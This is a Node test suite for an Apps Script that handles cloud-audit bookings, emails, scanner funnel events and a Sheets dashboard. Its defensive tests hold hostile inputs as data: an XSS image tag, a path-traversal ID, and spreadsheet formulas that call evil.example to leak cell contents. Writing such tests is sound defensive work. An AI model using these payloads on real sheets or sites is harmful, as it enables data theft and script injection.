// Runs case-study-mailer.gs in Node with fake Google services (Sheets, Mail,
// Cache, Properties), so the Apps Script logic can be tested without
// deploying it.
//   node --test tests/case-study-mailer.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { randomUUID } from 'node:crypto';
import vm from 'node:vm';

const SOURCE = readFileSync(new URL('../case-study-mailer.gs', import.meta.url), 'utf8');

function load({ quota = 100, failMailTo = null, token = null } = {}) {
  const sheets = {};
  const sent = [];
  const cache = new Map();
  const props = new Map(token ? [['EVENTS_TOKEN', token]] : []);
  const logs = [];
  const formats = [];
  const sheet = name => {
    const rows = (sheets[name] ||= []);
    const range = (r, c, nr = 1, nc = 1) => ({
      getValues: () => Array.from({ length: nr }, (_, i) =>
        Array.from({ length: nc }, (_, j) => (rows[r - 1 + i] || [])[c - 1 + j] ?? '')),
      setValues: vals => vals.forEach((row, i) => row.forEach((v, j) => {
        (rows[r - 1 + i] ||= [])[c - 1 + j] = v;
      })),
      setValue: v => { (rows[r - 1] ||= [])[c - 1] = v; },
      setNumberFormat: f => formats.push([name, r, c, f]),
    });
    return {
      getLastRow: () => rows.length,
      getLastColumn: () => Math.max(0, ...rows.map(r => r.length)),
      getMaxColumns: () => Math.max(26, ...rows.map(r => r.length)),
      insertColumnsAfter: () => {},
      appendRow: r => rows.push(r),
      setFrozenRows: () => {},
      setName: n => { sheets[n] = rows; delete sheets[name]; },
      clear: () => { rows.length = 0; },
      getDataRange: () => ({ getValues: () => rows.map(r => r.slice()) }),
      getRange: range,
    };
  };
  const ctx = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ({
      getSheetByName: n => (sheets[n] ? sheet(n) : null),
      insertSheet: n => sheet(n),
      getSheets: () => [sheet('Sheet1')],
    }) },
    MailApp: {
      getRemainingDailyQuota: () => quota,
      sendEmail: m => {
        if (failMailTo && m.to === failMailTo) throw new Error('simulated mail failure');
        sent.push(m);
      },
    },
    CacheService: { getScriptCache: () => ({
      get: k => cache.get(k) ?? null,
      put: (k, v) => cache.set(k, v),
    }) },
    PropertiesService: { getScriptProperties: () => ({
      getProperty: k => props.get(k) ?? null,
      setProperty: (k, v) => props.set(k, v),
    }) },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: s => ({ setMimeType: () => ({ getContent: () => s }) }),
    },
    Utilities: {
      formatDate: (d, _tz, fmt) => (fmt === 'yyMMdd' ? '260930' : new Date(d).toISOString().slice(0, 10)),
      base64Encode: b => Buffer.from(b).toString('base64'),
      computeDigest: (_a, s) => [...Buffer.from(String(s))],
      DigestAlgorithm: { MD5: 'md5' },
      getUuid: () => randomUUID(),
    },
    Session: { getScriptTimeZone: () => 'Asia/Kolkata' },
    UrlFetchApp: { fetch: () => ({ getBlob: () => ({ setName() { return this; } }) }) },
    Logger: { log: m => logs.push(m) },
  };
  vm.createContext(ctx);
  vm.runInContext(SOURCE, ctx);
  const post = parameter => JSON.parse(ctx.doPost({ parameter }).getContent());
  // Read a booking row by column name, so tests don't depend on column order.
  const cell = (rowIndex, header) => {
    const rows = sheets['Audit bookings'];
    assert.ok(rows[0].includes(header), `no column "${header}"`);
    return rows[rowIndex][rows[0].indexOf(header)];
  };
  return { post, sheets, sent, logs, ctx, cell, props, formats };
}

const request = (over = {}) => ({
  form: 'audit_booking', name: 'Asha Rao', email: 'Asha@Example.com', company: 'Acme Cloud',
  company_site: 'acme.example', role: 'CTO / VP Engineering', industry: 'SaaS / software',
  company_size: '51–200', provider: 'AWS', spend: '$10k–$50k', source: 'LinkedIn', page: 'test',
  ...over,
});
const TOKEN = 'a'.repeat(64);
const event = (reference, over = {}) => ({ form: 'audit_event', token: TOKEN, reference, ...over });
const isDate = v => Object.prototype.toString.call(v) === '[object Date]';   // dates come from the sandbox realm

test('valid request: logged with an audit ID, hello@ notified, customer confirmed', () => {
  const { post, sheets, sent, cell } = load();
  const res = post(request());
  assert.equal(res.ok, true);
  assert.match(res.reference, /^AUD-260930-[A-HJ-NP-Z2-9]{4}$/);

  assert.equal(sheets['Audit bookings'].length, 2, 'header + one request');
  assert.equal(cell(1, 'Audit ID'), res.reference);
  assert.equal(cell(1, 'Status'), 'Audit Requested');
  assert.ok(isDate(cell(1, 'Lead at')) && isDate(cell(1, 'Audit requested at')));
  assert.equal(cell(1, 'Access verified at'), '', 'later stages wait for real events');
  assert.equal(cell(1, 'Email'), 'asha@example.com', 'email is lower-cased');
  assert.equal(cell(1, 'Website'), 'acme.example');
  assert.equal(cell(1, 'Role'), 'CTO / VP Engineering');
  assert.equal(cell(1, 'Industry'), 'SaaS / software');
  assert.equal(cell(1, 'Company size'), '51–200');
  assert.equal(cell(1, 'Cloud provider'), 'AWS');
  assert.equal(cell(1, 'Monthly cloud spend'), '$10k–$50k');
  assert.equal(cell(1, 'Source'), 'LinkedIn');
  assert.equal(cell(1, 'Potential monthly savings (USD)'), '', 'no numbers until a scan reports them');

  assert.equal(sent.length, 2);
  assert.equal(sent[0].to, 'hello@exommerce.online');
  assert.equal(sent[0].replyTo, 'asha@example.com');
  assert.ok(sent[0].subject.startsWith('Audit request ' + res.reference));
  assert.ok(sent[0].body.includes(`python -m exaudit setup --reference ${res.reference} --customer "Acme Cloud"`));
  assert.equal(sent[1].to, 'asha@example.com');
  assert.equal(sent[1].replyTo, 'hello@exommerce.online');
  assert.equal(sent[1].subject, `Your free cloud cost & infrastructure audit (${res.reference})`);
  assert.ok(sent[1].htmlBody.includes(res.reference));
  assert.ok(sent[1].body.startsWith('Hi Asha,'));
});

test('confirmation email: 24-hour promise, team review, how to get ready, no price, nothing personal', () => {
  const { post, sent } = load();
  post(request());
  for (const text of [sent[1].body, sent[1].htmlBody]) {
    assert.ok(text.includes('You receive your initial audit findings within 24 hours of successful AWS access.'));
    assert.ok(text.includes('Every audit is reviewed by the eXommerce cloud optimization team before results are shared.'));
    assert.ok(text.includes('To get ready'));
    assert.ok(text.includes('Turn on Cost Explorer now'));
    assert.ok(text.includes('AWS account ID and the regions you use'));
    assert.ok(text.includes('We never ask for access keys, passwords or root credentials.'));
    assert.ok(!/₹|25,000|INR|Engagement/.test(text), 'no paid offer or price during beta');
    assert.ok(text.includes('about 5 minutes'));
    assert.ok(text.includes('The eXommerce cloud optimization team'), 'signed by the team');
    assert.ok(!/bhavin|founder|personally|refund|guarantee|\$299/i.test(text), text);
  }
  assert.ok(!sent[1].body.includes('Azure'), 'no not-on-AWS note for AWS customers');
  assert.ok(sent[0].body.includes('Check that reply first'), 'hello@ is reminded to read their account details');
});

test('automatic setup email is off until our audit account ID is set', () => {
  const { post, sent, cell } = load();
  post(request({ region: 'ap-south-1' }));
  assert.equal(sent.length, 2, 'confirmation and hello@ only');
  assert.equal(cell(1, 'AWS region'), 'ap-south-1');
  assert.equal(cell(1, 'External ID'), '');
  assert.match(sent[0].body, /--region <their main region>/);
});

test('with a region and our audit account set, setup instructions go out automatically', () => {
  const { post, sent, cell, props } = load();
  props.set('AUDITOR_ACCOUNT_ID', '111122223333');
  const res = post(request({ region: 'ap-south-1' }));
  assert.equal(sent.length, 3);
  const [notice, confirm, setup] = sent;
  const ext = cell(1, 'External ID');
  assert.match(ext, new RegExp(`^exommerce-${res.reference.toLowerCase()}-[0-9a-f]{24}$`));
  assert.equal(setup.to, 'asha@example.com');
  assert.equal(setup.subject, `Set up your cloud audit (${res.reference}): about 5 minutes`);
  assert.ok(setup.body.includes(`sts:ExternalId: ${ext}`) && setup.body.includes('AWS: arn:aws:iam::111122223333:root'));
  assert.equal((setup.body.match(/--region ap-south-1/g) || []).length, 3);
  assert.ok(confirm.body.includes('Your setup instructions are in a separate email we just sent.'));
  assert.ok(!confirm.body.includes('regions you use'), 'we already know their region');
  assert.ok(notice.body.includes(`--external-id ${ext}`) && notice.body.includes('emailed to them automatically'));
  assert.ok(isDate(cell(1, 'Setup sent at')));
  for (const m of sent) assert.ok(!/₹|25,000/.test(m.body), 'no price anywhere');

  // Plain-text mail gets re-wrapped in transit, so the paste block must arrive in a <pre>, verbatim.
  const unescape = s => s.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&amp;/g, '&');
  const blocks = [...setup.htmlBody.matchAll(/<pre[^>]*>([\s\S]*?)<\/pre>/g)].map(m => unescape(m[1]));
  const plain = [...setup.body.matchAll(/```bash\n([\s\S]*?)\n```/g)].map(m => m[1]);
  assert.equal(blocks.length, 2);
  assert.deepEqual(blocks, plain);
  assert.ok(blocks[0].includes(`                sts:ExternalId: ${ext}`), 'YAML indentation intact');
  for (const words of ['Sign in to the AWS console', 'Open <b>AWS CloudShell</b>', 'Paste this whole block',
                       '<b>Can:</b> view resource configuration', 'We never need access keys']) {
    assert.ok(setup.htmlBody.includes(words), `HTML keeps "${words}"`);
  }
});

test('no automatic setup without a usable region, or for other clouds', () => {
  for (const over of [{ region: 'Not sure' }, { region: '' }, { provider: 'Azure', region: 'ap-south-1' }]) {
    const { post, sent, props } = load();
    props.set('AUDITOR_ACCOUNT_ID', '111122223333');
    assert.equal(post(request(over)).ok, true);
    assert.equal(sent.length, 2, JSON.stringify(over));
  }
  const { post } = load();
  assert.equal(post(request({ region: 'mars-1' })).error, 'Please choose your main AWS region.');
});

test('the emailed instructions are exactly what the scanner writes', async () => {
  const { execFileSync } = await import('node:child_process');
  const { existsSync } = await import('node:fs');
  const { fileURLToPath } = await import('node:url');
  const python = fileURLToPath(new URL('../scanner/.venv/Scripts/python.exe', import.meta.url));
  if (!existsSync(python)) return;    // the scanner's environment isn't installed here
  const { ctx } = load();
  const ext = 'exommerce-aud-261004-abcd-0123456789abcdef01234567';
  const js = ctx.setupInstructions('AUD-261004-ABCD', 'Acme Cloud',
    ctx.roleTemplate('AUD-261004-ABCD', '111122223333', ext), 'ap-south-1');
  const py = execFileSync(python, ['-c', [
    'import sys; from exaudit import onboarding as o',
    `t = o.template("AUD-261004-ABCD", o.principal_arn("111122223333"), "${ext}")`,
    // bytes, not text: Windows would turn \n into \r\n and encode → in the console's code page
    'sys.stdout.buffer.write(o.instructions("AUD-261004-ABCD", "Acme Cloud", t, "ap-south-1").encode("utf-8"))'].join('\n')],
    { cwd: fileURLToPath(new URL('../scanner/', import.meta.url)), encoding: 'utf8' });
  assert.equal(js, py);
});

test('a bookings tab from before the new columns gets them appended, not renamed', () => {
  const { post, sheets, ctx } = load();
  const old = ctx.BOOKING_HEADERS.slice(0, -3);
  sheets['Audit bookings'] = [old.slice(), ['AUD-OLD-1', 'Audit Requested']];
  post(request());
  const rows = sheets['Audit bookings'];
  assert.deepEqual(rows[0], ctx.BOOKING_HEADERS.slice());
  assert.equal(rows[1][0], 'AUD-OLD-1', 'existing rows untouched');
  assert.equal(rows.length, 3);
  assert.ok(!Object.keys(sheets).some(n => n.includes('old format')));
});

test('not on AWS: the customer is told we audit AWS today', () => {
  const { post, sent } = load();
  post(request({ provider: 'Google Cloud' }));
  assert.match(sent[0].body, /Not on AWS/);
  assert.match(sent[1].body, /We audit AWS today/);
  assert.ok(!sent[1].body.includes('Cost Explorer'), 'no AWS setup steps for a cloud we don\'t audit yet');
  const mixed = load();
  mixed.post(request({ provider: 'AWS + other clouds' }));
  assert.ok(!/We audit AWS today/.test(mixed.sent[1].body));
});

test('validation rejects bad input and logs or sends nothing', () => {
  const cases = [
    [{ name: '' }, /name and company/],
    [{ company: '   ' }, /name and company/],
    [{ email: 'not-an-email' }, /valid work email/],
    [{ company_site: 'not a website' }, /website/],
    [{ role: 'Wizard' }, /role/],
    [{ industry: '' }, /industry/],
    [{ company_size: '9000' }, /company size/],
    [{ provider: 'Oracle' }, /cloud provider/],
    [{ spend: '$1M' }, /monthly cloud spend/],
    [{ source: undefined }, /^Please tell us how you heard about us\.$/],
  ];
  for (const [over, msg] of cases) {
    const { post, sent, sheets } = load();
    const res = post(request(over));
    assert.equal(res.ok, false, JSON.stringify(over));
    assert.match(res.error, msg);
    assert.equal(sent.length, 0);
    assert.equal(sheets['Audit bookings'], undefined);
  }
});

test('website is optional and accepts common forms', () => {
  for (const site of ['', 'https://acme.example/', 'www.acme.co.in', 'http://acme.io/about']) {
    const { post } = load();
    assert.equal(post(request({ company_site: site })).ok, true, site);
  }
});

test('the Website field is not mistaken for the honeypot', () => {
  const { post, sent } = load();
  assert.equal(post(request({ company_site: 'acme.example' })).ok, true);
  assert.equal(sent.length, 2, 'a real request with a website still goes through');
});

test('honeypot: bots get a fake success and nothing happens', () => {
  const { post, sent, sheets } = load();
  assert.deepEqual(post(request({ website: 'http://spam' })), { ok: true });
  assert.equal(sent.length, 0);
  assert.equal(sheets['Audit bookings'], undefined);
});

test('resubmitting within 10 minutes returns the same audit ID and sends nothing new', () => {
  const { post, sent, sheets } = load();
  const first = post(request());
  const again = post(request({ email: 'asha@example.com', company: 'ACME CLOUD' }));
  assert.equal(again.ok, true);
  assert.equal(again.reference, first.reference);
  assert.equal(again.duplicate, true);
  assert.equal(sent.length, 2);
  assert.equal(sheets['Audit bookings'].length, 2);
});

test('email quota exhausted: kept as a failed lead, customer told to email', () => {
  const { post, sent, cell } = load({ quota: 1 });
  const res = post(request());
  assert.equal(res.ok, false);
  assert.match(res.error, /hello@exommerce.online/);
  assert.equal(sent.length, 0);
  assert.match(cell(1, 'Status'), /^Failed: daily email quota/);
  assert.ok(isDate(cell(1, 'Lead at')));
  assert.equal(cell(1, 'Audit requested at'), '', 'a request we never received is not counted as one');
});

test('notification failure: logged as failed and reported, so the page falls back to email', () => {
  const { post, cell } = load({ failMailTo: 'hello@exommerce.online' });
  const res = post(request());
  assert.equal(res.ok, false);
  assert.match(cell(1, 'Status'), /^Failed: Error: simulated mail failure/);
});

test('confirmation failure does not fail a request hello@ already has', () => {
  const { post, logs, cell } = load({ failMailTo: 'asha@example.com' });
  const res = post(request());
  assert.equal(res.ok, true);
  assert.equal(cell(1, 'Status'), 'Audit Requested');
  assert.match(logs[0], /confirmation failed/);
});

test('HTML in names is escaped in the confirmation email', () => {
  const { post, sent } = load();
  post(request({ name: '<img src=x onerror=alert(1)> Rao' }));
  assert.ok(!sent[1].htmlBody.includes('<img'));
  assert.ok(sent[1].htmlBody.includes('&lt;img'));
});

test('spreadsheet formulas from visitors are stored as plain text', () => {
  const { post, sheets, cell } = load();
  post(request({ name: '=IMAGE("https://evil.example/?"&A1)', company: '@SUM(1)' }));
  assert.equal(cell(1, 'Name'), `'=IMAGE("https://evil.example/?"&A1)`);
  assert.equal(cell(1, 'Company'), "'@SUM(1)");
  assert.ok(isDate(cell(1, 'Lead at')), 'non-strings are untouched');

  const other = load();
  other.post({ form: 'contact', first_name: '=1+1', email: 'a@b.co', company: 'C', message: 'Hi' });
  assert.equal(other.sheets['Contact enquiries'][1][1], "'=1+1", 'contact tab protected too');
});

test('small accounts are flagged for hello@', () => {
  const { post, sent } = load();
  post(request({ spend: 'Under $3k' }));
  assert.match(sent[0].body, /Small account \(under \$3k\/month\)/);
});

test('long fields are trimmed to their limits', () => {
  const { post, cell } = load();
  post(request({ name: 'N'.repeat(300), company: 'C'.repeat(300) }));
  assert.equal(cell(1, 'Name').length, 100);
  assert.equal(cell(1, 'Company').length, 120);
});

// ---- funnel events from the scanner ---------------------------------------------------------

test('events need the token from Script Properties', () => {
  const noToken = load();
  assert.deepEqual(noToken.post(event('AUD-260930-AAAA', { stage: 'Scan Started' })),
                   { ok: false, error: 'not authorized' }, 'no token configured: nothing accepted');
  const wrong = load({ token: TOKEN });
  assert.deepEqual(wrong.post({ ...event('AUD-260930-AAAA'), token: 'b'.repeat(64) }),
                   { ok: false, error: 'not authorized' });
  assert.equal(wrong.sheets['Audit bookings'], undefined);
});

test('events move an audit through the funnel with the first timestamp of each stage', () => {
  const { post, cell } = load({ token: TOKEN });
  const { reference } = post(request());
  const t0 = '2026-10-01T09:00:00Z';
  assert.equal(post(event(reference, { stage: 'AWS Access Verified', at: t0 })).ok, true);
  assert.equal(cell(1, 'Status'), 'AWS Access Verified');
  assert.equal(cell(1, 'Access verified at').toISOString(), '2026-10-01T09:00:00.000Z');

  post(event(reference, { stage: 'Scan Started', at: '2026-10-01T09:05:00Z' }));
  post(event(reference, {
    stage: 'Scan Completed', at: '2026-10-01T09:20:00Z', bill: '12450.5', monthly: '1830.25',
    annual: '21963', findings: '14', categories: 'Cleanup $1,210 · Rightsizing $620 · Commitments $0',
    severity: 'High 1 · Medium 4 · Low 9', problems: 'Idle NAT gateways; Unattached EBS volumes',
    regions: 'ap-south-1, us-east-1', stack: 'Compute: EC2; Containers: EKS; CI/CD: CodePipeline',
  }));
  assert.equal(cell(1, 'Status'), 'Scan Completed');
  assert.equal(cell(1, 'Monthly AWS bill (USD)'), 12450.5, 'numbers are stored as numbers');
  assert.equal(cell(1, 'Potential monthly savings (USD)'), 1830.25);
  assert.equal(cell(1, 'Findings'), 14);
  assert.equal(cell(1, 'Problems found'), 'Idle NAT gateways; Unattached EBS volumes');

  // A re-run of the same stage keeps the first time; an earlier stage never moves status back.
  post(event(reference, { stage: 'Scan Started', at: '2026-10-01T11:00:00Z' }));
  assert.equal(cell(1, 'Scan started at').toISOString(), '2026-10-01T09:05:00.000Z');
  assert.equal(cell(1, 'Status'), 'Scan Completed');

  post(event(reference, { stage: 'Review Completed', at: '2026-10-01T15:00:00Z' }));
  post(event(reference, { stage: 'Results Delivered', at: '2026-10-02T05:30:00Z' }));
  assert.equal(cell(1, 'Hours to results'), 20.5, 'measured from AWS access, as promised');
  post(event(reference, { stage: 'Customer', outcome: 'Engagement signed', revenue: '25000' }));
  assert.equal(cell(1, 'Status'), 'Customer');
  assert.equal(cell(1, 'Revenue (INR)'), 25000);
  assert.equal(cell(1, 'Commercial outcome'), 'Engagement signed');
  assert.equal(cell(1, 'Paid opportunity at'), '', 'skipped stages are not backfilled');
});

test('an audit that started off the website gets its own row', () => {
  const { post, sheets, cell } = load({ token: TOKEN });
  const res = post(event('AUD-261001-REF1', { stage: 'AWS Access Verified' }));
  assert.equal(res.ok, true);
  assert.equal(sheets['Audit bookings'].length, 2);
  assert.equal(cell(1, 'Audit ID'), 'AUD-261001-REF1');
  assert.equal(cell(1, 'Source'), 'Direct');
  assert.ok(isDate(cell(1, 'Lead at')) && isDate(cell(1, 'Access verified at')));
  assert.equal(cell(1, 'Status'), 'AWS Access Verified');
});

test('bad events are rejected; bad numbers and formulas never land in the Sheet', () => {
  const { post, cell } = load({ token: TOKEN });
  const { reference } = post(request());
  assert.equal(post(event(reference, { stage: 'Teleported' })).error, 'unknown stage');
  assert.equal(post(event('../../etc', { stage: 'Scan Started' })).error, 'bad audit ID');
  post(event(reference, { monthly: 'lots', stack: '=IMPORTXML("https://evil.example")' }));
  assert.equal(cell(1, 'Potential monthly savings (USD)'), '');
  assert.equal(cell(1, 'Stack'), `'=IMPORTXML("https://evil.example")`);
});

test('the events token is never written to the Sheet', () => {
  const { post, sheets } = load({ token: TOKEN });
  const { reference } = post(request());
  post(event(reference, { stage: 'Scan Completed', monthly: '10' }));
  post(event('AUD-261001-NEW1', { stage: 'Scan Started' }));
  const everything = JSON.stringify(sheets);
  assert.ok(!everything.includes(TOKEN));
});

test('createEventsToken stores a long random token in Script Properties', () => {
  const { ctx, props } = load();
  const token = ctx.createEventsToken();
  assert.match(token, /^[0-9a-f]{64}$/);
  assert.equal(props.get('EVENTS_TOKEN'), token);
  assert.notEqual(ctx.createEventsToken(), token, 'running it again replaces the token');
});

// ---- beta dashboard --------------------------------------------------------------------------

test('columnLetter', () => {
  const { ctx } = load();
  assert.deepEqual([1, 26, 27, 52, 53].map(n => ctx.columnLetter(n)), ['A', 'Z', 'AA', 'AZ', 'BA']);
});

test('dashboard: live formulas over the bookings tab, an empty state, no stored numbers', () => {
  const { ctx, sheets, formats } = load();
  const count = ctx.buildDashboard();
  const dash = sheets['Beta dashboard'];
  assert.equal(dash.length, count);
  assert.ok(sheets['Audit bookings'], 'creates the bookings tab it reads from');
  assert.match(dash[1][0], /No audits yet/, 'says so instead of charting zeros');

  const headers = sheets['Audit bookings'][0];
  const col = h => ctx.columnLetter(headers.indexOf(h) + 1);
  const funnel = dash.slice(3, 13);
  assert.deepEqual(funnel.map(r => r[0]), ['Lead', 'Audit Requested', 'AWS Access Verified', 'Scan Started',
    'Scan Completed', 'Review Completed', 'Results Delivered', 'Paid Opportunity', 'Customer', 'Revenue']);
  // A lone comparison stays TRUE/FALSE, and in Sheets FALSE>0 is TRUE: it must become a number first.
  assert.equal(funnel[9][1], `=SUMPRODUCT(--((('Audit bookings'!${col('Revenue at')}2:${col('Revenue at')}<>""))*1>0))`);
  for (const row of funnel) assert.match(row[1], /\)\*1>0\)\)$/, row[0]);
  assert.equal((funnel[0][1].match(/<>""/g) || []).length, 10, 'Lead counts audits at any stage');
  assert.equal(funnel[1][2], '=IF($B$5=0,"—",B5/$B$5)', 'shares are of audit requests (row 5)');

  // Every value cell is a formula or a label: nothing typed in that could go stale.
  for (const row of dash) for (const v of row.slice(1)) {
    assert.ok(v === '' || /^=/.test(v) || /^[A-Za-z ]/.test(v), JSON.stringify(v));
  }
  const labels = dash.map(r => r[0]);
  for (const label of ['Potential savings as a share of spend', 'Revenue per delivered audit (INR)',
                       'Median hours from AWS access to results', 'Source', 'Common problems',
                       'Stack seen in audits', 'Idle NAT gateways', 'EKS (Kubernetes)']) {
    assert.ok(labels.includes(label), label);
  }
  const source = labels.indexOf('Source');
  assert.deepEqual(dash[source].slice(1), ['Audit requests', 'Gave AWS access', 'Customers']);
  assert.equal(dash[source + 1][0], 'LinkedIn');
  assert.ok(dash[source + 1][2].includes(`'Audit bookings'!${col('Source')}2:${col('Source')}="LinkedIn"`));
  const share = labels.indexOf('Potential savings as a share of spend') + 1;
  assert.ok(formats.some(([n, r, c, f]) => n === 'Beta dashboard' && r === share && c === 2 && f === '0.0%'));

  assert.equal(ctx.buildDashboard(), count, 'rebuilding replaces, never duplicates');
  assert.equal(sheets['Beta dashboard'].length, count);
});

test('a bookings tab in an older format is set aside, never written into', () => {
  const { post, sheets, cell } = load();
  sheets['Audit bookings'] = [['Timestamp', 'Reference', 'Name'], ['old', 'AUD-OLD', 'Someone']];
  post(request());
  const old = Object.keys(sheets).find(n => n.startsWith('Audit bookings (old format'));
  assert.ok(old, 'renamed');
  assert.deepEqual(sheets[old][1], ['old', 'AUD-OLD', 'Someone'], 'old rows untouched');
  assert.equal(sheets['Audit bookings'].length, 2);
  assert.equal(cell(1, 'Name'), 'Asha Rao');
});

// ---- recurring reviews -----------------------------------------------------------------------

test('due reviews are sent to hello@ once', () => {
  const { post, sheets, sent, ctx, cell } = load();
  post(request({ email: 'due@example.com' }));
  post(request({ email: 'later@example.com', company: 'Later Co' }));
  post(request({ email: 'none@example.com', company: 'None Co' }));
  const rows = sheets['Audit bookings'];
  const next = rows[0].indexOf('Next review');
  rows[1][next] = new Date(Date.now() - 86400000);                // due yesterday
  rows[2][next] = new Date(Date.now() + 30 * 86400000);           // next month
  sent.length = 0;

  assert.equal(ctx.remindDueScans(), 1);
  assert.equal(sent.length, 1);
  assert.equal(sent[0].to, 'hello@exommerce.online');
  assert.equal(sent[0].subject, '1 cost review due');
  assert.ok(sent[0].body.includes('due@example.com') && sent[0].body.includes(cell(1, 'Audit ID')));
  assert.ok(!sent[0].body.includes('later@example.com'), 'not due yet');
  assert.ok(isDate(cell(1, 'Last reminder')));

  sent.length = 0;
  assert.equal(ctx.remindDueScans(), 0, 'nothing twice');
  assert.equal(sent.length, 0);
});

test('needs no Google permission beyond what the live version already has', () => {
  // A new permission means the web app stops answering until the owner re-approves it, so
  // the site's forms would fail in between. Services with no permission of their own
  // (Cache, Content, Properties, Utilities) are fine.
  const code = SOURCE.replace(/\/\/.*$/gm, '');
  const services = new Set([...code.matchAll(/\b([A-Z][A-Za-z]*(?:App|Service))\./g)].map(m => m[1]));
  const granted = ['SpreadsheetApp', 'MailApp', 'UrlFetchApp', 'CacheService', 'ContentService', 'PropertiesService'];
  assert.deepEqual([...services].filter(s => !granted.includes(s)), [], 'e.g. ScriptApp asks to "run when you are not present"');
  assert.deepEqual([...new Set([...code.matchAll(/\bSession\.(\w+)/g)].map(m => m[1]))], ['getScriptTimeZone'],
    'Session.getScriptTimeZone needs no permission; getActiveUser would');
});

test('no bookings sheet yet: reminders do nothing', () => {
  const { ctx, sent } = load();
  assert.equal(ctx.remindDueScans(), 0);
  assert.equal(sent.length, 0);
});

// ---- everything else ---------------------------------------------------------------------------

test('GET reports which forms this deployment handles, and sets up a missing dashboard', () => {
  const { ctx, sheets, formats } = load();
  const res = JSON.parse(ctx.doGet().getContent());
  assert.equal(res.ok, true);
  assert.deepEqual(res.forms, ['case_study', 'contact', 'audit_booking', 'audit_event']);
  assert.ok(sheets['Beta dashboard'], 'created by the status check');
  const built = formats.length;
  ctx.doGet();
  assert.equal(formats.length, built, 'an existing dashboard is never rebuilt');
});

test('the first audit request builds the dashboard; a dashboard problem never fails a request', () => {
  const first = load();
  first.post(request());
  assert.ok(first.sheets['Beta dashboard']);

  const broken = load();
  broken.ctx.buildDashboard = () => { throw new Error('boom'); };
  const res = broken.post(request());
  assert.equal(res.ok, true, 'the visitor still gets their audit ID');
  assert.equal(broken.sent.length, 2);
  assert.match(broken.logs.join('\n'), /Dashboard not built: Error: boom/);
});

test('the editor test booking is a valid request', () => {
  const { ctx, logs } = load();
  ctx.testBooking();
  assert.equal(JSON.parse(logs[0]).ok, true);
});

test('waitlist sign-ups from cloud-audit.html go through the contact handler', () => {
  const { post, sheets, sent } = load();
  // exactly what the page's waitlist form sends
  const res = post({ form: 'contact', first_name: 'Test Person', last_name: '', email: 'test@acme.example',
    company: 'Acme', need: 'Waitlist: Stress Test', message: 'Please add me to the Stress Test waitlist.',
    page: 'https://exommerce.online/cloud-audit.html' });
  assert.equal(res.ok, true);
  assert.equal(sent.length, 1);
  assert.equal(sent[0].subject, 'Waitlist: Stress Test · Test Person · Acme');
  assert.equal(sent[0].replyTo, 'test@acme.example');
  const row = sheets['Contact enquiries'][1];
  assert.equal(row[sheets['Contact enquiries'][0].indexOf('Area')], 'Waitlist: Stress Test');
  const enquiry = load();
  enquiry.post({ form: 'contact', first_name: 'A', last_name: 'B', email: 'a@b.co', company: 'C', message: 'Hi' });
  assert.equal(enquiry.sent[0].subject, 'New enquiry: A B · C', 'homepage enquiries keep their subject');
});

test('existing flows still route correctly', () => {
  const { post, sheets } = load();
  const contact = post({ form: 'contact', first_name: 'A', email: 'a@b.co', company: 'C', message: 'Hi' });
  assert.equal(contact.ok, true);
  assert.equal(sheets['Contact enquiries'].length, 2);
  const cs = post({ study: 'nope', first_name: 'A', email: 'a@b.co', company: 'C', consent: 'yes' });
  assert.deepEqual(cs, { ok: false, error: 'Unknown case study' });
});
